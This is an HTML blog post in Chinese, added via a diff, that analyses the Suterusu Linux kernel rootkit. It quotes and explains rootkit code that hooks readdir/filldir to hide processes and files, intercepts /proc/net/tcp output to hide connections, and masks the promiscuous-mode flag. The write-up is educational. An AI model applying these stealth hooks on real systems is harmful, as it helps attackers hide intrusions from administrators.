@@ -1,0 +1,498 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-Hans" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" href="/img/favicon.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="
+suterusu的文件、进程、端口隐藏代码简解，位于main.c
+">
+  <meta name="author" content="Shawn">
+  <meta name="keywords" content="">
+  
+  <title>Suterusu源码阅读和分析(3) - P3aceSh4wn&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.7.2/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"yoursite.com","root":"/","version":"1.8.11","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}},"search_path":"/local-search.xml"};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 4.2.0"><link rel="alternate" href="/atom.xml" title="P3aceSh4wn's blog" type="application/atom+xml">
+</head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>peaceSh4wn's blog</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                Home
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                Archives
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                Categories
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                Tags
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                Homies
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                About
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/default.jpeg') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="Suterusu源码阅读和分析(3)">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-author" aria-hidden="true"></i>
+      Shawn
+    </span>
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2022-07-31 14:47" pubdate>
+        July 31, 2022 pm
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      830 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      11
+       分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">Suterusu源码阅读和分析(3)</h1>
+            
+            <div class="markdown-body">
+              <blockquote>
+<p>suterusu的文件、进程、端口隐藏代码简解，位于main.c</p>
+</blockquote>
+<a id="more"></a>
+
+<h2 id="0x01-文件系统相关"><a href="#0x01-文件系统相关" class="headerlink" title="0x01 文件系统相关"></a>0x01 文件系统相关</h2><h3 id="文件和进程隐藏"><a href="#文件和进程隐藏" class="headerlink" title="文件和进程隐藏"></a>文件和进程隐藏</h3><p>文件结构体和文件操作结构体推荐看《Linux内核设计与实现》去初步了解，进程隐藏实际上是文件隐藏的复用</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// 存放readdir函数指针</span><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-title">int</span> <span class="hljs-params">(*proc_iterate)</span><span class="hljs-params">(struct file *file, <span class="hljs-keyword">void</span> *dirent, <span class="hljs-keyword">filldir_t</span> filldir)</span></span>;<br><br><span class="hljs-comment">/* Hook /proc for hiding processes */</span><br>proc_iterate = get_vfs_iterate(<span class="hljs-string">"/proc"</span>);<br>hijack_start(proc_iterate, &amp;n_proc_iterate);<br></code></pre></td></tr></table></figure>
+
+<p>拿到<code>/proc</code>和<code>/</code>目录的文件结构体中<code>readdir</code>函数指针</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// 宏定义，readdir参数列表</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> ITERATE_PROTO struct file *file, void *dirent, filldir_t filldir</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> FILLDIR_VAR filldir</span><br><br><span class="hljs-comment">// hook函数具体实现</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">n_proc_iterate</span> <span class="hljs-params">( ITERATE_PROTO )</span><br></span>&#123;<br>    <span class="hljs-keyword">int</span> ret;<br>	<br>    <span class="hljs-comment">// 传入的filldir直接赋值，因为上面参数使用了宏，为了编译通过这里也要使用宏</span><br>    <span class="hljs-comment">// 其实这个操作我现在看起来并没有意义</span><br>    proc_filldir = FILLDIR_VAR;<br><br>    hijack_pause(proc_iterate);<br>    <span class="hljs-comment">// 用来替换参数的宏函数，见下</span><br>    REPLACE_FILLDIR(proc_iterate, n_proc_filldir);<br>    hijack_resume(proc_iterate);<br><br>    <span class="hljs-keyword">return</span> ret;<br>&#125;<br><br><span class="hljs-comment">// 将我们新filldir函数替换上去</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> REPLACE_FILLDIR(ITERATE_FUNC, FILLDIR_FUNC) \<br>&#123;                                                   \<br>    ret = ITERATE_FUNC(file, dirent, &amp;FILLDIR_FUNC);\<br>&#125;</span><br></code></pre></td></tr></table></figure>
+
+
+
+<ul>
+<li>进程隐藏的新filldir函数</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> <span class="hljs-title">n_proc_filldir</span><span class="hljs-params">( <span class="hljs-keyword">void</span> *__buf, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *name, <span class="hljs-keyword">int</span> namelen, <span class="hljs-keyword">loff_t</span> offset, u64 ino, <span class="hljs-keyword">unsigned</span> d_type )</span><br></span>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">hidden_proc</span> *<span class="hljs-title">hp</span>;</span><br>    <span class="hljs-keyword">char</span> *endp;<br>    <span class="hljs-keyword">long</span> pid;<br><br>    pid = simple_strtol(name, &amp;endp, <span class="hljs-number">10</span>);<br><br>    list_for_each_entry ( hp, &amp;hidden_procs, <span class="hljs-built_in">list</span> )<br>        <span class="hljs-keyword">if</span> ( pid == hp-&gt;pid )<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>    <span class="hljs-keyword">return</span> proc_filldir(__buf, name, namelen, offset, ino, d_type);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+
+
+<ul>
+<li>文件隐藏的新filldir函数</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> <span class="hljs-title">n_root_filldir</span><span class="hljs-params">( <span class="hljs-keyword">void</span> *__buf, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *name, <span class="hljs-keyword">int</span> namelen, <span class="hljs-keyword">loff_t</span> offset, u64 ino, <span class="hljs-keyword">unsigned</span> d_type )</span><br></span>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">hidden_file</span> *<span class="hljs-title">hf</span>;</span><br><br>    list_for_each_entry ( hf, &amp;hidden_files, <span class="hljs-built_in">list</span> )<br>        <span class="hljs-keyword">if</span> ( ! <span class="hljs-built_in">strcmp</span>(name, hf-&gt;name) )<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>    <span class="hljs-keyword">return</span> root_filldir(__buf, name, namelen, offset, ino, d_type);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>文件隐藏有个小bug，strcmp不含长度比较，直接使用会出错，能看见下图中字符指针存在脏数据，故字符串比较需要带上长度</p>
+<p><img src="/2022/07/31/Suterusu%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB%E5%92%8C%E5%88%86%E6%9E%90-3/FileHideBug.png" srcset="/img/loading.gif" lazyload alt="文件隐藏bug"></p>
+<h2 id="0x02-网络系统相关"><a href="#0x02-网络系统相关" class="headerlink" title="0x02 网络系统相关"></a>0x02 网络系统相关</h2><h3 id="连接隐藏"><a href="#连接隐藏" class="headerlink" title="连接隐藏"></a>连接隐藏</h3><p>要隐藏连接和端口，就需要对netstat的底层调用有所了解</p>
+<p>这里使用strace来查看函数调用，<code>strace netstat -antu</code>，结果如下</p>
+<p><img src="/2022/07/31/Suterusu%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB%E5%92%8C%E5%88%86%E6%9E%90-3/StraceNetstat.png" srcset="/img/loading.gif" lazyload alt="StraceNetstat"></p>
+<ul>
+<li><code>/proc/net/tcp</code>文件提供了tcp的连接信息，是由<code>net/ipv4/tcp_ipv4.c</code>中的<code>tcp4_seq_show()</code>实现信息打印的 <a href="https://guanjunjian.github.io/2017/11/09/study-8-proc-net-tcp-analysis/" target="_blank" rel="noopener">ref</a></li>
+<li><code>tcp4_seq_show</code>就是<code>seq_operations</code>中的<code>show</code>函数 <a href="https://blog.wohin.me/posts/linux-rootkit-02-04/" target="_blank" rel="noopener">ref</a></li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// include/linux/seq_file.h</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">seq_file</span> &#123;</span><br>	<span class="hljs-keyword">char</span> *buf; <span class="hljs-comment">// 缓冲区</span><br>	<span class="hljs-keyword">size_t</span> <span class="hljs-built_in">size</span>; <span class="hljs-comment">// 缓冲区容量</span><br>	<span class="hljs-keyword">size_t</span> from;<br>	<span class="hljs-keyword">size_t</span> count; <span class="hljs-comment">// 缓冲区已经使用的量</span><br>	<span class="hljs-keyword">size_t</span> pad_until;<br>	<span class="hljs-keyword">loff_t</span> index;<br>	<span class="hljs-keyword">loff_t</span> read_pos;<br>	u64 version;<br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mutex</span> <span class="hljs-title">lock</span>;</span><br>	<span class="hljs-keyword">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">seq_operations</span> *<span class="hljs-title">op</span>;</span><br>	<span class="hljs-keyword">int</span> poll_event;<br>	<span class="hljs-keyword">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file</span> *<span class="hljs-title">file</span>;</span><br>	<span class="hljs-keyword">void</span> *<span class="hljs-keyword">private</span>;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">seq_operations</span> &#123;</span><br>	<span class="hljs-keyword">void</span> * (*start) (struct seq_file *m, <span class="hljs-keyword">loff_t</span> *pos);<br>	<span class="hljs-keyword">void</span> (*<span class="hljs-built_in">stop</span>) (struct seq_file *m, <span class="hljs-keyword">void</span> *v);<br>	<span class="hljs-keyword">void</span> * (*next) (struct seq_file *m, <span class="hljs-keyword">void</span> *v, <span class="hljs-keyword">loff_t</span> *pos);<br>	<span class="hljs-keyword">int</span> (*show) (struct seq_file *m, <span class="hljs-keyword">void</span> *v);<br>&#125;;<br><br><span class="hljs-keyword">static</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tcp_seq_afinfo</span> <span class="hljs-title">tcp4_seq_afinfo</span> = &#123;</span><br>	.name		= <span class="hljs-string">"tcp"</span>,<br>	.family		= AF_INET,<br>	.seq_fops	= &amp;tcp_afinfo_seq_fops,<br>	.seq_ops	= &#123;<br>		.start      = tcp_seq_start,<br>		.show		= tcp4_seq_show,<br>		.next		= tcp4_seq_next,<br>		.<span class="hljs-built_in">stop</span>		= tcp4_seq_stop,<br>	&#125;,<br>&#125;;<br></code></pre></td></tr></table></figure>
+
+<p><a href="https://www.cnblogs.com/gaoyang3513/p/10989700.html" target="_blank" rel="noopener">ref: Proc中使用seq_file，数据如何传递 </a></p>
+<p>另外如果要hook另一种网络连接查看方式ss，其系统调用链和netstat不同，用<code>strace ss -antu</code>查看后发现需要hook的函数是<code>recvmsg</code>，后续会尝试实现在自己的demo中</p>
+<p><img src="/2022/07/31/Suterusu%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB%E5%92%8C%E5%88%86%E6%9E%90-3/StraceSs.png" srcset="/img/loading.gif" lazyload alt="StraceSs"></p>
+<h3 id="隐藏混杂模式标记"><a href="#隐藏混杂模式标记" class="headerlink" title="隐藏混杂模式标记"></a>隐藏混杂模式标记</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// 代码中引入如下头文件，直接就可以调用这个导出过的接口</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;net/tcp.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;net/udp.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> <span class="hljs-title">dev_get_flags</span><span class="hljs-params">(<span class="hljs-keyword">const</span> struct net_device *dev )</span><br>    <br><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> <span class="hljs-title">n_dev_get_flags</span><span class="hljs-params">(<span class="hljs-keyword">const</span> struct net_dev *dev)</span> </span>&#123;<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> ret;<br>    <br>    hook_pause(dev_get_flags);<br>    ret = dev_get_flags(dev);<br>    hook_resume(dev_get_flags);<br>    <br>    <span class="hljs-keyword">if</span> (hide_promisc) <br>    	ret &amp;= ~IFF_PROMISC; <span class="hljs-comment">// 混杂标志位置空</span><br>        <br>    <span class="hljs-keyword">return</span> ret;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>通过hook原生api <code>dev_get_flags</code>，将混杂标志位隐藏，混杂模式被rootkit用来进行网络流量嗅探，不过其实这样很容易被发现，只要管理员调整混杂模式或使用tcpdump抓包就会被发现</p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/Sec-Dev/">Sec Dev</a>
+                    
+                      <a class="hover-with-bg" href="/categories/Red-Team/">Red Team</a>
+                    
+                      <a class="hover-with-bg" href="/categories/Linux-Rootkit/">Linux Rootkit</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7%E6%9C%88%E6%9C%88%E8%AF%BB/">安全工具月月读</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">
+                  
+                    本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" target="_blank" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！
+                  
+                </p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2022/07/20/Suterusu%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB%E5%92%8C%E5%88%86%E6%9E%90-2/">
+                        <span class="hidden-mobile">Suterusu源码阅读和分析(2)</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;TOC</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+
+  
+
+  
+</footer>
+
+
+  <!-- SCRIPTS -->
+  
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.3/dist/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.1/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.8/dist/clipboard.min.js" ></script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.12/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+</body>
+</html>
